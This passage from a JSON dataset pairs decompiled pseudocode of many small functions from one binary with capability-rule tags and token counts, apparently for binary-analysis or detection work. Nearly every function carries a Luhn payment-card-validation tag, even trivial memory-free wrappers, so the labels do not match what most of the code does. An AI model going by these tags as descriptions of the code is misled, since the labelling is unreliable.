            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0002792c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg3;\n    uint32_t uStackX8;\n    ushort uStack104;\n    uchar auStack102 [78];\n    \n    uVar1 = fcn.00031248(arg1 + 1, 0, 0);\n    iVar2 = fcn.000270f4(3, uVar1, 0, 0);\n    if (iVar2 == 0) {\n        arg3 = fcn.00030c98(uStackX8);\n        if (arg3 == 0) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.000270f4(3, uVar1, arg3, uStackX8);\n            if (iVar2 == 0) {\n                uStack104 = 0x26;\n                fcn.0006683c(uVar1, auStack102, 10);\n                *(arg2 + 0x130) = 1;\n                uVar1 = fcn.0004ff9c(0, arg3, &uStack104, &uStack104);\n            }\n            else {\n                uVar1 = iVar2 + 0x191U | 0x21590000;\n            }\n            fcn.00030d24(arg3);\n            *(arg2 + 0x134) = 0;\n            if (uVar1 != 0) {\n                *(arg2 + 8) = 0;\n            }\n        }\n    }\n    else {\n        uVar1 = iVar2 + 0x191U | 0x21590000;\n    }\n    return uVar1;\n}\n",
        "token_count": 393
    },
    "00032148": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00032148(ulong *arg1)\n\n{\n    if (arg1[2] != 0) {\n        fcn.00030d24(arg1[2]);\n    }\n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    return;\n}\n",
        "token_count": 75
    },
    "000285e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.000285e0(char *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    int64_t *arg1_00;\n    ulong *puVar2;\n    uint32_t auStackX24 [2];\n    code *pcStackX32;\n    \n    fcn.00032174(0x7edb0);\n    for (puVar2 = *0x7edd0; puVar2 != NULL; puVar2 = *puVar2) {\n        if (puVar2[1] != *0x7edd8) {\n            fcn.0001612c(puVar2[1], puVar2 + 0x25);\n        }\n    }\n    fcn.000321f4(0x7edb0);\n    fcn.0001612c(*0x7ede0, 0x7ede8);\n    arg1_00 = fcn.00030c98(0x150);\n    if (arg1_00 == NULL) {\n        iVar1 = fcn.00030eb8();\ncode_r0x000287b8:\n        if (iVar1 == 0) goto code_r0x000287df;\n    }\n    else {\n        fcn.0006677c(arg1_00, 0, 0x150);\n        if (arg2 == 0) {\n            if (*arg1 == '&') {\n                iVar1 = fcn.0002792c(arg1, arg1_00);\n            }\n            else {\n                iVar1 = fcn.000278a0(arg1_00, arg1);\n            }\n        }\n        else {\n            iVar1 = fcn.00027870(arg1_00, arg2, arg1, arg1);\n        }\n        if (iVar1 == 0) {\n            iVar1 = fcn.00027818(arg1_00, auStackX24);\n            if (iVar1 == 0) {\n                iVar1 = fcn.000166b8(arg1_00[1], auStackX24[0]);\n                if (iVar1 == 0) {\n                    fcn.00066830(arg1_00 + 2, arg1, 0x104);\n                    *(arg1_00 + 0x113) = 0;\n                    fcn.00032174(0x7edb0);\n                    for (puVar2 = *0x7edd0; (puVar2 != NULL && (puVar2[1] != arg1_00[1])); puVar2 = *puVar2) {\n                        iVar1 = fcn.000667ee(puVar2 + 2, arg1_00 + 2);\n                        if (iVar1 == 0) break;\n                    }\n                    fcn.000321f4(0x7edb0);\n                    if (puVar2 == NULL) {\n                        iVar1 = fcn.00027834(arg1_00, 0x11f50, &pcStackX32);\n                        if (iVar1 == 0) {\n                            fcn.00027834(arg1_00, 0x11f40, arg1_00 + 0x23);\n                            fcn.00027834(arg1_00, 0x11f30, arg1_00 + 0x24);\n                            iVar1 = (*pcStackX32)(*0x7edd0);\n                            if (iVar1 == 0) {\n                                fcn.00032284(0x7edb0);\n                                **0x7edc8 = arg1_00;\n                                *0x7edc8 = arg1_00;\n                                fcn.00032304(0x7edb0);\n                                goto code_r0x000287b8;\n                            }\n                        }\n                    }\n                    else {\n                        iVar1 = 0x215901fc;\n                    }\n                }\n            }\n        }\n    }\n    if ((arg1_00 != NULL) && (arg1_00[1] != 0)) {\n        fcn.00016744(arg1_00[1]);\n    }\n    fcn.00027840(arg1_00);\n    fcn.00030d24(arg1_00);\ncode_r0x000287df:\n    fcn.00032174(0x7edb0);\n    for (puVar2 = *0x7edd0; puVar2 != NULL; puVar2 = *puVar2) {\n        if (puVar2[1] != *0x7edd8) {\n            fcn.0001612c(puVar2[1], puVar2 + 0x25);\n        }\n    }\n    fcn.000321f4(0x7edb0);\n    return iVar1;\n}\n",
        "token_count": 1024
    },
    "00028828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00028828(ulong arg1)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    ulong *arg1_00;\n    ulong *puVar4;\n    ulong uVar5;\n    \n    fcn.00032284(0x7edb0);\n    uVar5 = 0;\n    puVar2 = **0x7edd0;\n    puVar4 = *0x7edd0;\n    while( true ) {\n        arg1_00 = puVar2;\n        if (arg1_00 == NULL) {\n            fcn.00032304(0x7edb0);\n            return 0x215901fd;\n        }\n        iVar3 = fcn.000667ee(arg1_00 + 2, arg1);\n        if (iVar3 == 0) break;\n        puVar2 = *arg1_00;\n        puVar4 = arg1_00;\n    }\n    pcVar1 = arg1_00[0x24];\n    *puVar4 = *arg1_00;\n    if (arg1_00 == *0x7edc8) {\n        *0x7edc8 = puVar4;\n    }\n    fcn.00032304(0x7edb0);\n    if (pcVar1 == NULL) {\n        uVar5 = 0x215901fe;\n    }\n    else {\n        (*pcVar1)();\n    }\n    fcn.00016744(arg1_00[1]);\n    fcn.00027840(arg1_00);\n    fcn.00030d24(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 363
    },
    "0002963c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0002963c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg3;\n    int64_t arg4;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint32_t uStackX24;\n    \n    arg3 = 0;\n    arg4 = 0;\n    iVar1 = fcn.000270f4(3, arg1, 0, 0);\n    if (iVar1 == 0) {\n        arg3 = fcn.00030c98(uStackX24);\n        if (arg3 == 0) {\n            uVar3 = 0x21590004;\n            goto code_r0x000296fc;\n        }\n        iVar1 = fcn.000270f4(3, arg1, arg3, uStackX24);\n        if (iVar1 == 0) {\n            arg4 = fcn.00031698(arg2, 0x11f04);\n            if (arg4 != 0) {\n                uVar2 = fcn.00030f3c(arg3, 1, uStackX24, arg4);\n                if (uVar2 == uStackX24) {\n                    uVar3 = 0;\n                    goto code_r0x000296fc;\n                }\n            }\n            uVar3 = fcn.00030eb8();\n            goto code_r0x000296fc;\n        }\n    }\n    uVar3 = iVar1 + 0x191U | 0x21590000;\ncode_r0x000296fc:\n    fcn.00030d24(arg3);\n    if (arg4 != 0) {\n        fcn.00030f2c(arg4);\n    }\n    return uVar3;\n}\n",
        "token_count": 390
    },
    "00029f80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00029f80(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint32_t auStackX8 [8];\n    uint32_t uStack344;\n    uint32_t uStack340;\n    uint32_t uStack336;\n    uint8_t uStack324;\n    int32_t iStack320;\n    uchar auStack280 [280];\n    \n    auStackX8[0] = arg1;\n    fcn.00030310(0x7ee10);\n    iVar1 = fcn.00022168(0xfffffffe, 8, auStackX8, &uStack344);\n    if (iVar1 == 0) {\n        if (iStack320 != 0) {\n            iStack320 = iStack320 + -1;\n            fcn.0002231c(uStack344, uStack336, uStack340, 2);\n            if (iStack320 != 0) goto code_r0x0002a053;\n        }\n        iVar1 = fcn.000270f4(uStack336, uStack340, auStack280, 0x104);\n        if (iVar1 == 0) {\n            if ((uStack324 & 2) != 0) {\n                fcn.0002971c(auStack280, auStackX8[0]);\n            }\n            fcn.00031afc(auStack280);\n        }\n        fcn.0002225c(uStack344, uStack336, uStack340);\n    }\ncode_r0x0002a053:\n    fcn.00030378(0x7ee10);\n    return;\n}\n",
        "token_count": 352
    },
    "0002a3b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0002a3b0(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint32_t auStackX16 [2];\n    int64_t aiStackX24 [2];\n    \n    fcn.000302c0(0x7ee10);\n    aiStackX24[0] = 0;\n    fcn.00030310(0x7ee10);\n    iVar1 = fcn.00022138(0xfffffffe, 8, auStackX16, aiStackX24);\n    if ((iVar1 == 0) && (uVar3 = 0,  auStackX16[0] != 0)) {\n        iVar2 = 0;\n        do {\n            fcn.0002231c(*(iVar2 + aiStackX24[0]), *(iVar2 + 8 + aiStackX24[0]), *(iVar2 + 4 + aiStackX24[0]), 2);\n            fcn.00029f80(*(iVar2 + 0xc + aiStackX24[0]));\n            uVar3 = uVar3 + 1;\n            iVar2 = iVar2 + 0x40;\n        } while (uVar3 < auStackX16[0]);\n    }\n    fcn.00030378(0x7ee10);\n    fcn.000207c4(aiStackX24[0]);\n    return;\n}\n",
        "token_count": 316
    },
    "0002a3d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002a3d0(void)\n\n{\n    fcn.0002a128(1);\n    if (*0x7ee10 != 0) {\n        fcn.00030d24(*0x7ee10);\n        *0x7ee10 = 0;\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0002a3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002a3f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00032734(0x7ee28);\n    if (iVar1 != 0) {\n        *0x7ee20 = 1;\n        fcn.0002fcb8(0x8e728);\n        fcn.00032748(0x7ee28, 0);\n        fcn.00032710(0x7ee28);\n    }\n    if (*0x8e728 != 0) {\n        fcn.00030d24(*0x8e728);\n        *0x8e728 = 0;\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0002fc94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0002fc94(int64_t *arg1)\n\n{\n    if (*arg1 != 0) {\n        fcn.00030d24(*arg1);\n        *arg1 = 0;\n    }\n    return;\n}\n",
        "token_count": 53
    },
    "0002ac9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002ac9c(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    ulong *puVar3;\n    bool bVar4;\n    ulong uStack56;\n    ulong uStack48;\n    \n    uStack48 = 0x2acac;\n    fcn.0002fc18(0x8e728);\n    *0x7ee20 = 0;\n    LOCK();\n    bVar4 = *0x7e250 == 0;\n    *0x7e250 = *0x7e250 ^ bVar4 * *0x7e250;\n    if ((bVar4) && (iVar1 = (*_fcn.00011220)(&stack0xffffffffffffffc8, 0x1f03ff, 0, 0, 0, 0x1a880, 0),  iVar1 == 0)) {\n        fcn.000667be(uStack56, 0, 0);\n        fcn.000666f2(uStack56);\n    }\n    puVar3 = fcn.00030c98(0x10);\n    if (puVar3 != NULL) {\n        *puVar3 = 0x2ac64;\n        puVar3[1] = 0;\n        iVar1 = (*_fcn.00011220)(0x7ee28, 0x1f03ff, 0, 0, 0, 0x1a8f4, puVar3);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    uVar2 = fcn.00066782();\n    fcn.00030e10(uVar2);\n    return 0xffffffff;\n}\n",
        "token_count": 379
    },
    "0002fc18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0002fc18(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.00030cc4(0x18);\n    *arg1 = iVar1;\n    if (iVar1 != 0) {\n        (*_fcn.00011608)(iVar1, 1);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "0002fc50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.0002fc50(int64_t *arg1, ulong noname_1, ulong arg3)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.00030cc4(0x18);\n    *arg1 = iVar1;\n    if (iVar1 != 0) {\n        (*_fcn.00011608)(iVar1, arg3 == 0, 0);\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 107
    },
    "0002fcb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0002fcb8(int64_t *arg1)\n\n{\n    ulong uVar1;\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        uVar1 = 0;\n    }\n    else {\n        (*_fcn.00011638)(*arg1, 0, 0);\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 90
    },
    "000302c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000302c0(ulong *arg1)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00030cc4(0x38);\n    *arg1 = uVar1;\n    // WARNING: Could not recover jumptable at 0x000302e0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x113a8)(uVar1, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00030310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.00030310(ulong *arg1)\n\n{\n    (*_fcn.00011630)(*arg1, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 43
    },
    "0003045c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003045c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    uchar *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    iVar2 = fcn.0003292c(arg2);\n    iVar2 = fcn.00030c98(iVar2 * 2);\n    if (iVar2 == 0) {\n        iVar1 = -0x3fffff66;\n    }\n    else {\n        fcn.0003285c(arg2, iVar2, 0xffffffffffffffff);\n        fcn.00066704(auStack88, iVar2);\n        puStack56 = auStack88;\n        auStack72[0] = 0x30;\n        uStack64 = 0;\n        uStack48 = 0;\n        uStack40 = 0;\n        uStack32 = 0;\n        iVar1 = fcn.0001f2b4(arg1, 0x1f0001, auStack72);\n        fcn.00030d24(iVar2);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    uVar3 = fcn.00066782(iVar1);\n    return uVar3;\n}\n",
        "token_count": 315
    },
    "00030728": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00030728(int64_t arg1, int64_t arg2, ulong arg3, int64_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint32_t auStackX8 [8];\n    \n    if (((arg1 == 0) || (arg2 == 0)) || (arg4 == NULL)) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        *arg4 = 0;\n        uVar2 = fcn.0006688a();\n        if ((uVar2 == -0x3fffffdd) || (uVar2 == -0x7ffffffb)) {\n            iVar3 = fcn.00030c98(auStackX8[0]);\n            *arg4 = iVar3;\n            if (iVar3 == 0) {\n                uVar2 = 0x21590004;\n            }\n            else {\n                uVar1 = fcn.0006688a(arg1, arg2, arg3, iVar3, auStackX8[0], auStackX8);\n                uVar2 = uVar1;\n                if (uVar1 != 0) {\n                    fcn.00030d24(*arg4);\n                }\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 298
    },
    "000308a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.000308a4(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uchar *puVar1;\n    \n    if (arg3 != 0) {\n        puVar1 = arg3 + -1 + arg1;\n        do {\n            *puVar1 = puVar1[arg2 - arg1];\n            puVar1 = puVar1 + -1;\n            arg3._0_4_ = arg3 + -1;\n        } while (arg3 != 0);\n    }\n    return arg1;\n}\n",
        "token_count": 123
    },
    "000308cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.000308cc(char *arg1, ulong arg2)\n\n{\n    char *pcVar1;\n    \n    pcVar1 = NULL;\n    for (; *arg1 != '\\0'; arg1 = arg1 + 1) {\n        if (*arg1 == arg2) {\n            pcVar1 = arg1;\n        }\n    }\n    return pcVar1;\n}\n",
        "token_count": 83
    },
    "00030c58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00030c58(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.00030a54(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 51
    },
    "00030c78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00030c78(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    fcn.00030a54(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 51
    },
    "00030c98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00030c98(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        uVar1 = 0x7ef38;\n    }\n    else {\n        uVar1 = fcn.0001ca70(1, arg1, 0x7346744e);\n    }\n    return uVar1;\n}\n",
        "token_count": 85
    },
    "00030cc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00030cc4(int64_t arg1)\n\n{\n    ulong uVar1;\n    \n    if (arg1 == 0) {\n        uVar1 = 0x7ef38;\n    }\n    else {\n        uVar1 = fcn.0001ca70(0, arg1, 0x7346744e);\n    }\n    return uVar1;\n}\n",
        "token_count": 85
    },
    "00030cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00030cec(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t in_RDX;\n    \n    iVar1 = fcn.00030c98(arg1 * in_RDX);\n    if (iVar1 != 0) {\n        fcn.0006677c(iVar1, 0, arg1 * in_RDX);\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "00030d48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00030d48(char *arg1)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    char *pcVar4;\n    \n    uVar3 = 0xffffffffffffffff;\n    pcVar4 = arg1;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.00030c98(~uVar3);\n    if (iVar2 != 0) {\n        iVar2 = iVar2 - arg1;\n        do {\n            cVar1 = *arg1;\n            arg1[iVar2] = cVar1;\n            arg1 = arg1 + 1;\n        } while (cVar1 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00030d84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00030d84(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    \n    uVar3 = 0xffffffffffffffff;\n    piVar4 = arg1;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        iVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n    } while (iVar1 != 0);\n    iVar2 = fcn.00030c98(~uVar3 * 2);\n    if (iVar2 != 0) {\n        iVar2 = iVar2 - arg1;\n        do {\n            iVar1 = *arg1;\n            *(iVar2 + arg1) = iVar1;\n            arg1 = arg1 + 1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 213
    },
    "00030e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00030e10(ulong arg1)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    ulong *puVar7;\n    uint64_t *puVar8;\n    uint64_t uVar9;\n    \n    uVar1 = (**0x113f0)(0x7ef30);\n    puVar7 = 0x7ef50;\n    uVar9 = 0xffffffff;\n    uVar2 = 0;\n    uVar6 = 0;\n    puVar8 = 0x7ef50;\n    do {\n        if (*puVar8 < uVar9) {\n            uVar9 = *puVar8;\n            uVar2 = uVar6;\n        }\n        uVar5 = uVar6 + 1;\n        uVar6 = uVar5;\n        puVar8 = puVar8 + 3;\n    } while (uVar5 < 100);\n    iVar3 = uVar2;\n    uVar4 = fcn.000667ac();\n    *(iVar3 * 0x18 + 520000) = uVar4;\n    *(iVar3 * 0x18 + 0x7ef48) = arg1;\n    *(iVar3 * 0x18 + 0x7ef50) = *0x7f8c8;\n    *0x7f8c8 = *0x7f8c8 + 1;\n    if (*0x7f8c8 == 0) {\n        do {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 3;\n        } while (puVar7 < 0x7f8b0);\n    }\n    // WARNING: Could not recover jumptable at 0x00030eb1. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x113e8)(0x7ef30, uVar6 & 0xffffffffffffff00 | uVar1);\n    return;\n}\n",
        "token_count": 465
    },
    "00030eb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00030eb8(ulong param_1, uint64_t param_2)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    uVar4 = 0xffffffff;\n    uVar1 = (**0x113f0)(0x7ef30);\n    iVar5 = 0;\n    piVar3 = 0x7ef40;\n    do {\n        iVar2 = fcn.000667ac();\n        if (*piVar3 == iVar2) {\n            param_2 = iVar5 * 3;\n            uVar4 = *(iVar5 * 0x18 + 0x7ef48);\n            break;\n        }\n        piVar3 = piVar3 + 3;\n        iVar5 = iVar5 + 1;\n    } while (piVar3 < 0x7f8a0);\n    (**0x113e8)(0x7ef30, param_2 & 0xffffffffffffff00 | uVar1);\n    return uVar4;\n}\n",
        "token_count": 243
    },
    "00030f2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00030f2c(void)\n\n{\n    fcn.000666f2();\n    return 0;\n}\n",
        "token_count": 28
    },
    "00030f3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00030f3c(ulong arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX16;\n    uint uStackX20;\n    uchar auStack24 [8];\n    uint64_t uStack16;\n    \n    uStackX20 = 0xffffffff;\n    uStackX16 = 0xfffffffe;\n    iVar1 = fcn.0006671c(arg4, 0, 0, 0, auStack24, arg1, arg3 * arg2, &uStackX16, 0);\n    if (iVar1 == 0) {\n        uStack16 = uStack16 / arg2;\n    }\n    else {\n        uVar2 = fcn.00066782();\n        fcn.00030e10(uVar2);\n        uStack16 = 0;\n    }\n    return uStack16;\n}\n",
        "token_count": 212
    },
    "00030fb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00030fb8(ulong arg1, uint64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX16;\n    uint uStackX20;\n    uchar auStack24 [8];\n    uint64_t uStack16;\n    \n    uStackX20 = 0xffffffff;\n    uStackX16 = 0xfffffffe;\n    iVar1 = fcn.000667c4(arg4, 0, 0, 0, auStack24, arg1, arg3 * arg2, &uStackX16, 0);\n    if (iVar1 == 0) {\n        uStack16 = uStack16 / arg2;\n    }\n    else {\n        uVar2 = fcn.00066782();\n        fcn.00030e10(uVar2);\n        uStack16 = 0;\n    }\n    return uStack16;\n}\n",
        "token_count": 211
    },
    "00031074": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031074(ulong arg1)\n\n{\n    fcn.000666f2(arg1);\n    return 0;\n}\n",
        "token_count": 31
    },
    "00031088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00031088(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX32;\n    uint uStackX36;\n    uchar auStack24 [8];\n    uint uStack16;\n    \n    uStackX36 = 0xffffffff;\n    uStackX32 = 0xfffffffe;\n    iVar1 = fcn.000667c4(arg1, 0, 0, 0, auStack24, arg2, arg3, &uStackX32, 0);\n    if (iVar1 != 0) {\n        if (iVar1 == -0x3fffffef) {\n            uStack16 = 0;\n        }\n        else {\n            uVar2 = fcn.00066782();\n            fcn.00030e10(uVar2);\n            uStack16 = 0xffffffff;\n        }\n    }\n    return uStack16;\n}\n",
        "token_count": 210
    },
    "000310fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.000310fc(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uStackX32;\n    uint uStackX36;\n    uchar auStack24 [8];\n    uint uStack16;\n    \n    uStackX36 = 0xffffffff;\n    uStackX32 = 0xfffffffe;\n    iVar1 = fcn.0006671c(arg1, 0, 0, 0, auStack24, arg2, arg3, &uStackX32, 0);\n    if (iVar1 != 0) {\n        uVar2 = fcn.00066782();\n        fcn.00030e10(uVar2);\n        uStack16 = 0xffffffff;\n    }\n    return uStack16;\n}\n",
        "token_count": 181
    },
    "000311a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.000311a0(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t arg1_00;\n    uint uStackX32;\n    uint uStackX36;\n    uchar auStack24 [16];\n    \n    if (arg3 == 0) {\n        uStackX36 = 0;\n        uStackX32 = arg2;\n        iVar1 = fcn.0006672e(arg1, auStack24, &uStackX32, 8, 0xe);\n        if (iVar1 == 0) {\n            return arg2;\n        }\n        uVar2 = fcn.00066782();\n        arg1_00 = uVar2;\n    }\n    else {\n        arg1_00 = 0x16;\n    }\n    fcn.00030e10(arg1_00);\n    return 0xffffffff;\n}\n",
        "token_count": 206
    },
    "00031204": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
